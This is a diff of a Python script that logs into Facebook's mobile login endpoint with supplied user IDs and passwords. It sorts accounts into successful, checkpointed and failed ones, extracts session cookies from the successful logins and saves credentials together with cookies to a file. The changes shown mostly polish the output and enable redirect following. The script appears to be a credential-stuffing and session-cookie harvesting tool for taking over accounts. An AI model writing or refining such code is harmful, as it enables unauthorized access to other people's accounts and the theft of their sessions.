@@ -69,25 +69,29 @@ def check(uid, pww, ua):
             'user-agent': ua
         }
         
-        # Submit login
+        # Submit login with redirect following
         url = 'https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
-        sxr_respns = session.post(url, data=_data, headers=_header, allow_redirects=False)
+        sxr_respns = session.post(url, data=_data, headers=_header, allow_redirects=True)
         
-        # Get cookies
+        # Get all cookies after login
         login_coki = session.cookies.get_dict()
         
         print('\033[1;92m══════════════════════════════════════════════════')
         
+        # Check for successful login (c_user cookie means logged in)
         if "c_user" in login_coki:
-            print("\033[1;92m[✓] Login Successful!")
+            print("\033[1;92m[✓] LOGIN SUCCESSFUL!")
+            print("\033[1;92m[✓] COOKIES EXTRACTED SUCCESSFULLY!")
             print('\033[1;92m══════════════════════════════════════════════════')
             
             # Format cookie string
             coki = ";".join([f"{key}={value}" for key, value in login_coki.items()])
             
-            print(f"\033[1;93m[USER ID]: {login_coki.get('c_user')}")
-            print(f"\033[1;96m[COOKIE]:\n{coki}")
-            print('\033[1;92m══════════════════════════════════════════════════')
+            print(f"\033[1;93m[USER ID]: \033[1;97m{login_coki.get('c_user')}")
+            print(f"\033[1;96m\n[COOKIE]:\033[1;97m\n{coki}")
+            print('\033[1;92m\n══════════════════════════════════════════════════')
+            print("\033[1;92m[✓] COOKIE SAVED TO cookies.txt")
+            print('\033[1;92m══════════════════════════════════════════════════\n')
             
             oks.append(uid)
             
@@ -96,14 +100,18 @@ def check(uid, pww, ua):
                 f.write(f"{uid}|{pww}|{coki}\n")
                 
         elif "checkpoint" in login_coki:
-            print(f'\033[1;91m[×] Account Checkpoint')
-            print(f'\033[1;93m[!] {uid} | {pww}')
+            print(f'\033[1;91m[×] ACCOUNT CHECKPOINT / SECURITY CHECK')
+            print(f'\033[1;93m[!] Account: {uid}')
+            print(f'\033[1;93m[!] This account requires verification')
+            print('\033[1;92m══════════════════════════════════════════════════\n')
             cps.append(uid)
             
         else:
-            print(f'\033[1;91m[×] Login Failed')
-            print(f'\033[1;93m[!] {uid} | {pww}')
-            print(f'\033[1;90m[DEBUG] Cookies received: {list(login_coki.keys())}')
+            print(f'\033[1;91m[×] LOGIN FAILED')
+            print(f'\033[1;93m[!] Account: {uid}')
+            print(f'\033[1;93m[!] Reason: Invalid credentials or account issue')
+            print(f'\033[1;90m[DEBUG] Cookies: {list(login_coki.keys())}')
+            print('\033[1;92m══════════════════════════════════════════════════\n')
             
     except Exception as e:
         print(f'\033[1;91m[ERROR]: {str(e)}')
